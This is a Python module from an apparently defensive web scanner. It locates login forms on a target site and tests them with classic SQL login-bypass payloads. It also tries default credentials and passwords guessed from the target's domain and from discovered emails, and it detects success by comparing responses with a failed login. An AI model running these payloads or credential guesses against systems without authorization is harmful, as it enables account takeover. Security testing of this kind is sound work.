"""Login form discovery and authentication-bypass auditing.

Finds login forms on a target (password fields, auth-ish actions) and probes
them with classic SQL login-bypass payloads (``' OR 1=1--``,
``administrator'--``, …), comparing each response against a baseline failed
login to spot successful authentication without valid credentials.
"""

from __future__ import annotations

from difflib import SequenceMatcher
from urllib.parse import urljoin, urlsplit

import httpx
from bs4 import BeautifulSoup

from .discovery.parsers import extract_forms
from .models import LoginAuditResult, LoginBypassFinding, LoginForm

USER_AGENT = "darco/0.1 (login auditor)"

# Extra paths probed when looking for login pages.
LOGIN_PATHS = (
    "/login",
    "/signin",
    "/sign-in",
    "/logon",
    "/auth",
    "/account/login",
    "/admin/login",
    "/user/login",
    "/wp-login.php",
)

# Hidden field names commonly used for CSRF tokens.
CSRF_FIELDS = {
    "csrf",
    "csrf_token",
    "csrfmiddlewaretoken",
    "authenticity_token",
    "__requestverificationtoken",
    "_token",
    "xsrf-token",
}

# Classic SQL login-bypass payloads (tried in the username field first).
LOGIN_BYPASS_PAYLOADS = (
    "' OR 1=1--",
    "administrator'--",
    "admin'--",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1 #",
    "' OR '1'='1' #",
    '" OR "1"="1',
    "1' OR '1'='1",
    "'='",
)

# Common default credentials (username, password)
DEFAULT_CREDENTIALS = (
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "pass"),
    ("admin", "password123"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("guest", "guest"),
)


def generate_smart_credentials(
    target_url: str = "", emails: tuple[str, ...] | list[str] = ()
) -> list[tuple[str, str]]:
    """Generate smart credential pairs from common defaults, target domain, and discovered emails."""
    pairs: list[tuple[str, str]] = list(DEFAULT_CREDENTIALS)

    domain = ""
    domain_base = ""
    if target_url:
        raw = target_url.strip()
        if not raw.startswith(("http://", "https://")):
            raw = "http://" + raw
        host = (urlsplit(raw).hostname or "").lower()
        domain = host.split(":")[0]
        parts = [
            p for p in domain.split(".") if p and p not in ("www", "m", "api", "app")
        ]
        if len(parts) >= 2:
            domain_base = parts[-2]
        elif parts:
            domain_base = parts[0]

    # Standard administrative email addresses for the target domain (e.g. admin@domain.com)
    if domain and "." in domain and domain != "localhost":
        std_users = [
            "admin",
            "administrator",
            "root",
            "support",
            "info",
            "security",
            "contact",
            "service",
            "staff",
            "user",
            "test",
        ]
        for u in std_users:
            em = f"{u}@{domain}"
            pairs.append((em, u))
            pairs.append((em, "password"))
            pairs.append((em, "123456"))
            pairs.append((em, "admin123"))
            pairs.append((em, "P@ssword1"))
            if domain_base and len(domain_base) >= 3:
                pairs.append((em, domain_base))
                pairs.append((em, f"{domain_base}123"))
                pairs.append((em, f"{domain_base}2025"))
                pairs.append((em, f"{domain_base}2026"))

    # Incorporate discovered email addresses
    for em in emails:
        em_clean = em.strip().lower()
        if not em_clean or "@" not in em_clean:
            continue
        user_part = em_clean.split("@")[0]
        # Full email credential pairs
        pairs.append((em_clean, "password"))
        pairs.append((em_clean, "123456"))
        pairs.append((em_clean, "admin"))
        pairs.append((em_clean, "admin123"))
        pairs.append((em_clean, "P@ssword1"))
        pairs.append((em_clean, "Welcome1"))
        pairs.append((em_clean, "Welcome123"))
        pairs.append((em_clean, user_part))
        pairs.append((em_clean, f"{user_part}123"))
        if domain_base and len(domain_base) >= 3:
            pairs.append((em_clean, domain_base))
            pairs.append((em_clean, f"{domain_base}123"))

        # User-part extracted usernames (e.g. john.doe -> john.doe, john)
        if user_part not in ("admin", "root", "user", "test"):
            pairs.append((user_part, user_part))
            pairs.append((user_part, "password"))
            pairs.append((user_part, "123456"))
            pairs.append((user_part, f"{user_part}123"))
            if domain_base and len(domain_base) >= 3:
                pairs.append((user_part, f"{domain_base}123"))
            if "." in user_part:
                sub_user = user_part.split(".")[0]
                if len(sub_user) >= 2:
                    pairs.append((sub_user, "password"))
                    pairs.append((sub_user, f"{sub_user}123"))

    # Domain-derived passwords for admin/root
    if domain_base and len(domain_base) >= 3:
        for u in ("admin", "administrator", "root"):
            pairs.append((u, domain_base))
            pairs.append((u, f"{domain_base}123"))
            pairs.append((u, f"{domain_base}2025"))
            pairs.append((u, f"{domain_base}2026"))
            pairs.append((u, f"{domain_base}!"))
            pairs.append((u, f"{domain_base}@123"))
            pairs.append((u, f"{domain_base.capitalize()}123"))
            pairs.append((u, f"{domain_base.capitalize()}@123"))

    # Deduplicate while preserving order
    seen: set[tuple[str, str]] = set()
    unique_pairs: list[tuple[str, str]] = []
    for u, p in pairs:
        key = (u.strip(), p.strip())
        if key not in seen and key[0] and key[1]:
            seen.add(key)
            unique_pairs.append(key)
    return unique_pairs


_ACCOUNT_REDIRECT_HINTS = ("account", "profile", "dashboard", "home", "my-")
_LOGGED_IN_HINTS = (
    "logout",
    "log out",
    "sign out",
    "welcome",
    "logged in",
    "my account",
    "dashboard",
)
_ERROR_HINTS = ("invalid", "incorrect", "failed", "error", "not found", "forbidden")


def _default_client(timeout: float, verify: bool) -> httpx.Client:
    return httpx.Client(
        timeout=timeout, verify=verify, follow_redirects=False, trust_env=False
    )


def is_login_form(form) -> bool:
    """Heuristic: a form is a login form if it has a password input or an auth action."""
    inputs = getattr(form, "inputs", []) or []
    if any(i.type == "password" for i in inputs):
        return True
    action = (getattr(form, "action", "") or "").lower()
    return any(k in action for k in ("login", "signin", "signon", "logon", "auth"))


def _to_login_form(form, page_url: str) -> LoginForm:
    inputs = form.inputs or []
    username = next(
        (
            i
            for i in inputs
            if i.name
            and (
                i.name.lower()
                in ("username", "user", "login", "email", "mail", "loginname")
                or i.type in ("username", "email")
            )
        ),
        None,
    )
    password = next((i for i in inputs if i.type == "password"), None)
    csrf = next(
        (i for i in inputs if i.name and i.name.lower() in CSRF_FIELDS),
        None,
    )
    return LoginForm(
        url=page_url,
        action=form.action or page_url,
        method=(form.method or "POST").upper(),
        username_field=username.name if username else None,
        password_field=password.name if password else None,
        csrf_field=csrf.name if csrf else None,
        captcha=bool(getattr(form, "captcha", False)),
    )


def find_login_forms(
    url: str,
    *,
    timeout: float = 10.0,
    verify: bool = True,
    probe_common_paths: bool = True,
    client_factory=_default_client,
) -> list[LoginForm]:
    """Fetch the target page (plus common login paths) and return login forms."""
    forms: list[LoginForm] = []
    pages = [url]
    if probe_common_paths:
        pages += [urljoin(url, p) for p in LOGIN_PATHS]
    client = client_factory(timeout, verify)
    try:
        seen: set[tuple[str, str]] = set()
        for page in pages:
            try:
                resp = client.get(page, headers={"User-Agent": USER_AGENT})
            except (httpx.HTTPError, OSError):
                continue
            if resp.status_code >= 400:
                continue
            content_type = resp.headers.get("content-type", "")
            body = resp.text
            if "html" not in content_type and "<form" not in body.lower():
                continue
            soup = BeautifulSoup(body, "html.parser")
            for form in extract_forms(soup, str(resp.url)):
                if not is_login_form(form):
                    continue
                lf = _to_login_form(form, str(resp.url))
                key = (lf.action, lf.method)
                if key in seen:
                    continue
                seen.add(key)
                forms.append(lf)
    finally:
        try:
            client.close()
        except (httpx.HTTPError, OSError):
            pass
    return forms


def login_forms_from_forms(forms: list) -> list[LoginForm]:
    """Convert already-parsed (crawled) Form models into LoginForm models."""
    out: list[LoginForm] = []
    seen: set[tuple[str, str]] = set()
    for form in forms:
        if not is_login_form(form):
            continue
        lf = _to_login_form(form, form.action)
        key = (lf.action, lf.method)
        if key in seen:
            continue
        seen.add(key)
        out.append(lf)
    return out


def _response_signature(resp) -> dict:
    return {
        "status": resp.status_code,
        "location": (resp.headers.get("location") or "").lower(),
        "cookies": {c.name for c in resp.cookies.jar},
        "body": (resp.text or "").lower(),
    }


def _similarity(a: str, b: str) -> float:
    if a == b:
        return 1.0
    if not a or not b:
        return 0.0
    return SequenceMatcher(None, a[:4000], b[:4000]).ratio()


def _matched_markers(text: str, markers: tuple[str, ...]) -> list[str]:
    return [m for m in markers if m in text]


def _landing_markers(resp, client) -> list[str]:
    """Follow a redirect with the session-carrying client and find login markers."""
    if client is None:
        return []
    target = resp.headers.get("location") or ""
    if not target:
        return []
    try:
        landed = client.get(
            urljoin(str(resp.url), target),
            headers={"User-Agent": USER_AGENT},
        )
        return _matched_markers((landed.text or "").lower(), _LOGGED_IN_HINTS)
    except (httpx.HTTPError, OSError):
        return []


def _is_login_success(resp, base: dict, client=None) -> tuple[str, str] | None:
    """Return (success_indicator, detail) if the response looks like a logged-in state."""
    loc = (resp.headers.get("location") or "").lower()
    body = (resp.text or "").lower()

    # Redirect straight into an account area — the classic bypass signature.
    if (
        resp.status_code in (301, 302, 303, 307, 308)
        and any(h in loc for h in _ACCOUNT_REDIRECT_HINTS)
        and not any(h in loc for h in ("login", "signin", "error"))
    ):
        detail = f"redirect to '{loc}'"
        markers = _landing_markers(resp, client)
        if markers:
            detail += f" — landed page matched login keywords: {', '.join(markers)}"
        return "redirect_to_account", detail

    # A redirect where the baseline didn't redirect (and not back to login).
    if (
        resp.status_code in (301, 302, 303, 307, 308)
        and base["status"] not in (301, 302, 303, 307, 308)
        and not any(h in loc for h in ("login", "signin", "error", "logout"))
    ):
        detail = f"redirect to '{loc}'"
        markers = _landing_markers(resp, client)
        if markers:
            detail += f" — landed page matched login keywords: {', '.join(markers)}"
        return "unexpected_redirect", detail

    # Authenticated page content (logout/welcome/account) without error hints.
    if any(h in body for h in _LOGGED_IN_HINTS) and not any(
        h in body for h in _ERROR_HINTS
    ):
        matched = _matched_markers(body, _LOGGED_IN_HINTS)
        return (
            "authenticated_content",
            f"page contains login keywords: {', '.join(matched)}",
        )

    # A brand-new session/role cookie vs the failed-login baseline.
    base_cookies = base["cookies"]
    resp_cookies = {c.name for c in resp.cookies.jar}
    new_cookies = resp_cookies - base_cookies
    if new_cookies:
        return "new_session_cookie", f"new cookie(s): {', '.join(sorted(new_cookies))}"

    # Strong content divergence from the failed-login page (and not an error page).
    if (
        base["status"] == resp.status_code
        and _similarity(base["body"], resp.text or "") < 0.55
        and not any(h in body for h in _ERROR_HINTS)
    ):
        return "content_change", "response differs strongly from the failed-login page"

    return None


def audit_login_forms(
    forms: list[LoginForm],
    *,
    target: str = "",
    payloads: tuple[str, ...] | None = None,
    default_credentials: tuple[tuple[str, str], ...]
    | list[tuple[str, str]]
    | None = None,
    emails: tuple[str, ...] | list[str] = (),
    test_default_creds: bool = True,
    timeout: float = 10.0,
    verify: bool = True,
    test_password_field: bool = False,
    username_override: str | None = None,
    password_override: str | None = None,
    client_factory=_default_client,
) -> LoginAuditResult:
    """Audit login forms for SQL authentication-bypass payloads and smart default credentials."""
    payloads = payloads or LOGIN_BYPASS_PAYLOADS
    bypasses: list[LoginBypassFinding] = []
    notes: list[str] = []
    tested = 0
    client = client_factory(timeout, verify)
    try:
        for form in forms:
            uname_field = username_override or form.username_field or "username"
            pwd_field = password_override or form.password_field or "password"

            # Pull hidden inputs (CSRF etc.) fresh from the page so tokens stay valid.
            hidden: dict[str, str] = {}
            if form.url:
                try:
                    page = client.get(form.url, headers={"User-Agent": USER_AGENT})
                    if page.status_code < 400:
                        soup = BeautifulSoup(page.text, "html.parser")
                        for f in extract_forms(soup, form.url):
                            if (
                                f.action == form.action
                                and f.method.upper() == form.method
                            ):
                                hidden = {
                                    i.name: i.default or ""
                                    for i in f.inputs
                                    if i.hidden and i.name
                                }
                                break
                except (httpx.HTTPError, OSError):
                    pass

            def attempt(
                u: str,
                p: str,
                *,
                cur_form=form,
                cur_hidden=hidden,
                cur_uname=uname_field,
                cur_pwd=pwd_field,
            ) -> httpx.Response:
                data = dict(cur_hidden)
                data[cur_uname] = u
                data[cur_pwd] = p
                if cur_form.method.upper() == "GET":
                    return client.get(
                        cur_form.action,
                        params=data,
                        headers={"User-Agent": USER_AGENT},
                    )
                return client.post(
                    cur_form.action,
                    data=data,
                    headers={"User-Agent": USER_AGENT},
                )

            tested += 1
            base = attempt("darco-baseline-user", "darco-wrong-password-42")
            base_sig = _response_signature(base)

            # 1. Test classic SQL login-bypass payloads
            probed_fields = [(uname_field, payloads)]
            if test_password_field and form.password_field:
                probed_fields.append((pwd_field, payloads))

            for field, field_payloads in probed_fields:
                for payload in field_payloads:
                    other = (
                        "darco-wrong-password-42"
                        if field == uname_field
                        else "administrator"
                    )
                    resp = attempt(
                        payload if field == uname_field else other,
                        payload if field == pwd_field else other,
                    )
                    verdict = _is_login_success(resp, base_sig, client)
                    if not verdict:
                        continue
                    indicator, detail = verdict
                    bypasses.append(
                        LoginBypassFinding(
                            param=field,
                            payload=payload,
                            confidence=(
                                "high"
                                if indicator
                                in ("redirect_to_account", "authenticated_content")
                                else "medium"
                            ),
                            success_indicator=indicator,
                            evidence=(
                                f"Payload '{payload}' in '{field}' produced a logged-in state "
                                f"({detail}) vs baseline failed login "
                                f"(status {base_sig['status']})."
                            ),
                            suggestion=(
                                f"Authentication on '{form.action}' is bypassable — the "
                                f"'{field}' value reaches SQL unparameterized. Use parameterized "
                                f"queries and treat auth queries as untrusted input."
                            ),
                        )
                    )

            # 2. Test common default and smart domain/email credentials
            if test_default_creds:
                target_url_for_creds = target or form.url or form.action
                creds_list = (
                    default_credentials
                    if default_credentials is not None
                    else generate_smart_credentials(target_url_for_creds, emails=emails)
                )
                for u_cand, p_cand in creds_list:
                    resp = attempt(u_cand, p_cand)
                    verdict = _is_login_success(resp, base_sig, client)
                    if not verdict:
                        continue
                    indicator, detail = verdict
                    bypasses.append(
                        LoginBypassFinding(
                            param="credentials",
                            payload=f"{u_cand}:{p_cand}",
                            confidence="confirmed",
                            success_indicator=indicator,
                            evidence=(
                                f"Default credentials accepted on '{form.action}': "
                                f"username='{u_cand}', password='{p_cand}' ({detail}) vs baseline failed login "
                                f"(status {base_sig['status']})."
                            ),
                            suggestion=(
                                f"Change default credentials for user '{u_cand}' immediately "
                                "and enforce strong, unique authentication credentials."
                            ),
                        )
                    )

            if not form.username_field and not form.password_field:
                notes.append(
                    f"Form at '{form.action}' has no recognizable username/password fields — skipped probing."
                )
    finally:
        try:
            client.close()
        except (httpx.HTTPError, OSError):
            pass

    return LoginAuditResult(
        target=target,
        forms_found=forms,
        tested_forms=tested,
        bypasses=bypasses,
        notes=notes,
    )


__all__ = [
    "DEFAULT_CREDENTIALS",
    "LOGIN_BYPASS_PAYLOADS",
    "audit_login_forms",
    "find_login_forms",
    "generate_smart_credentials",
    "is_login_form",
    "login_forms_from_forms",
]
